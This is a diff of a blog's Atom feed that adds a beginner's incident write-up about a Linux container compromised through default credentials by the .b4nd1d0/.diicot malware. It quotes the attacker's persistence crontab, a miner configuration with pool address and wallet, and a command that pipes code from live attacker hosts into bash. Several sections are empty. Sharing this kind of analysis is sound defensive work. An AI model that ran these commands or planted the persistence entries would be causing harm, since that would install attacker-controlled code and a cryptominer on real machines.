@@ -1,1 +1,56 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="it"><generator uri="https://jekyllrb.com/" version="4.3.4">Jekyll</generator><link href="https://francescopirox.github.io/feed.xml" rel="self" type="application/atom+xml"/><link href="https://francescopirox.github.io/" rel="alternate" type="text/html" hreflang="it"/><updated>2024-09-29T09:39:30+00:00</updated><id>https://francescopirox.github.io/feed.xml</id><title type="html">Pironti’s research blog</title><subtitle>A simple site about my research journey. </subtitle></feed>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="it"><generator uri="https://jekyllrb.com/" version="4.3.4">Jekyll</generator><link href="https://francescopirox.github.io/feed.xml" rel="self" type="application/atom+xml"/><link href="https://francescopirox.github.io/" rel="alternate" type="text/html" hreflang="it"/><updated>2024-09-29T18:04:08+00:00</updated><id>https://francescopirox.github.io/feed.xml</id><title type="html">Pironti’s research blog</title><subtitle>A simple site about my research journey. </subtitle><entry><title type="html">a beginer’s analysis of .b4nd1d0 and .diicot</title><link href="https://francescopirox.github.io/blog/2024/retracingattacks/" rel="alternate" type="text/html" title="a beginer’s analysis of .b4nd1d0 and .diicot"/><published>2024-09-29T16:10:00+00:00</published><updated>2024-09-29T16:10:00+00:00</updated><id>https://francescopirox.github.io/blog/2024/retracingattacks</id><content type="html" xml:base="https://francescopirox.github.io/blog/2024/retracingattacks/"><![CDATA[<p>Malwares are one of the more destructive cyber-threats that daily endangers millions of computers and servers. In my case one of the many servers that I use was compromised. The following is my understanding of the attack that will likely change. I’m going to describe our set-up and the hint that I gained from manual log analysis and a bit of google search.</p> <h3 id="setup">Setup</h3> <ul> <li>LXC Container</li> <li>Public IP address</li> <li>Default credentials</li> </ul> <p>The perfect recipe for a disaster.</p> <h3 id="detection">Detection</h3> <p>The detection of this attack was done by an automatic mail signaling abnormal traffic directed to some Linux machines via SSH, with a lot of errors returned by theese machines.</p> <p>The logs were like this:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+2024-09-25T06:11:27.008471+00:00 Linux03 sshd[490844]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=MY_IP  user=root
+2024-09-25T06:11:28.679602+00:00 Linux03 sshd[490844]: Failed password for root from MY_IP port 36986 ssh2
+2024-09-25T06:11:30.056913+00:00 Linux03 sshd[491084]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=MY_IP  user=root
+...
+</code></pre></div></div> <p>There was in action a Login brute-force attack originating from our server trying to gain access to another machine. Once logged on looking at the logs from one of the unprivileged account, the <em>admin</em> one, the ssh service was trying to log in as different user to other IP address.</p> <h3 id="infection-and-foothold">Infection and foothold</h3> <p>The malware gained access by exploiting the default credential of the admin’s account <em>admin:admin</em>. The admin account was not in the sudoers and had just docker installed. A lateral movement is highly improbable because the root account was never utilized by the attacker. The attacker was probably another</p> <h3 id="securing-the-foothold">Securing the foothold</h3> <p>The foothold was secured by using a chron script:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crontab -l
+@daily /var/tmp/Documents/./.b4nd1d0
+@reboot /var/tmp/Documents/./.diicot &gt; /dev/null 2&gt;&amp;1 &amp; disown
+@reboot /var/tmp/Documents/./.diicot &gt; /dev/null 2&gt;&amp;1 &amp; disown
+* * * * * /var/tmp/Documents/./.diicot &gt; /dev/null 2&gt;&amp;1 &amp; disown
+* * * * * /var/tmp/Documents/./.diicot &gt; /dev/null 2&gt;&amp;1 &amp; disown
+@monthly /var/tmp/Documents/./.diicot &gt; /dev/null 2&gt;&amp;1 &amp; disown
+@monthly /var/tmp/Documents/./.diicot &gt; /dev/null 2&gt;&amp;1 &amp; disown
+*/30 * * * * /var/tmp/Documents/./.c &gt; /dev/null 2&gt;&amp;1 &amp; disown
+*/30 * * * * /var/tmp/Documents/./.c &gt; /dev/null 2&gt;&amp;1 &amp; disown
+</code></pre></div></div> <p>Using disown … job -l was empty</p> <h3 id="scope-of-the-attack">Scope of the attack</h3> <h3 id="b4nd1d0">b4nd1d0</h3> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#!/bin/bash
+m1lbe1()
+{
+if ! pgrep -x Opera &gt;/dev/null
+then
+                cd /var/tmp/Documents
+        ./Opera &gt;/dev/null 2&gt;&amp;1
+else
+                exit 1
+fi
+}
+m1lbe1
+
+</code></pre></div></div> <h3 id="diicot">diicot</h3> <h3 id="c">c</h3> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl -s 91.92.250.6/.x/black3 --connect-timeout 15 | bash &gt;/dev/null 2&gt;&amp;1 || curl -s x.diicot.xyz/.x/black3 --connect-timeout 15 | bash &gt;/dev/null 2&gt;&amp;1
+</code></pre></div></div> <h3 id="configyaml">config.yaml</h3> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>admin@machine:/# cat /var/tmp/Documents/config.json 
+
+            "tls-fingerprint": null,
+            "daemon": false,
+            "socks5": null,
+            "self-select": null,
+            "submit-to-origin": false
+        },
+        {
+            "algo": null,
+            "coin": null,
+            "url": "139.99.123.196:80",
+            "user": "87Fxj6UDiwYchWbn2k1mCZJxRxBC5TkLJQoP9EJ4E9V843Z9ySeKYi165Gfc2KjxZnKdxCkz7GKrvXkHE11bvBhD9dbMgQe",
+            "pass": "proxy2",
+            "rig-id": "",
+            "nicehash": false,
+            "keepalive": false,
+            "enabled": true,
+            "tls": false,
+            "tls-fingerprint": null,
+            "daemon": false,
+            "socks5": null,
+            "self-select": null,
+            "submit-to-origin": false
+        }
+
+</code></pre></div></div> <h3 id="obfuscation">Obfuscation</h3>]]></content><author><name></name></author><category term="malware"/><category term="malware"/><summary type="html"><![CDATA[How b4nd1d0 and diicot malwares works on a linux container]]></summary></entry></feed>
